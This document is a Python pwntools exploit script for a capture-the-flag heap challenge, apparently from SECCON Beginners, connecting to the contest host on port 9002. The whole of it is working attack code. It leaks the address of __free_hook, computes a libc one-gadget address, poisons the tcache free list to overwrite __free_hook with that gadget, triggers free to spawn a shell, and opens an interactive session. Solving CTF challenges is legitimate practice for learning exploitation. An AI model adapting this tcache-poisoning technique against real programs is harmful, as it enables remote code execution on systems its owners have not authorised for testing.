from pwn import *
r = remote('bh.quals.beginners.seccon.jp', 9002)
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def rev():
  r.recvuntil('\n> ')
def reada(s):
  r.sendline('1')
  r.send(s)
  rev()
def readb(s):
  r.sendline('2')
  r.send(s)
  rev()
def fre():
  r.sendline('3')
  rev()
def pheap():
  r.sendline('4')
  print r.recvuntil('-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-')
  rev()
def ptcache():
  r.sendline('5')
  print r.recvuntil('-=-=-=-=-=-=-=-=-=-=-=-=-=-=')
  rev()
def hint():
  r.sendline('6')
  print r.recvuntil('1. read(0, ')
  rev()
r.recvuntil('hook>: 0x')
free_hook = int(r.recvuntil('win>: 0x')[:12], 16)
log.info('free_hook: {}'.format(hex(free_hook)))
# win = int(r.recvuntil('Call')[:12], 16)
win = free_hook - l.sym['__free_hook'] + 0x4f322
log.info('win: {}'.format(hex(win)))
rev()
readb('AAAAAAAA')
fre()
pheap()
reada('B'*24 + p64(0x41) + p64(free_hook))
fre()
pheap()
readb('C'*8)
fre()
r.sendline('2')
r.send(p64(win))
fre()
# print r.recv()
r.interactive()
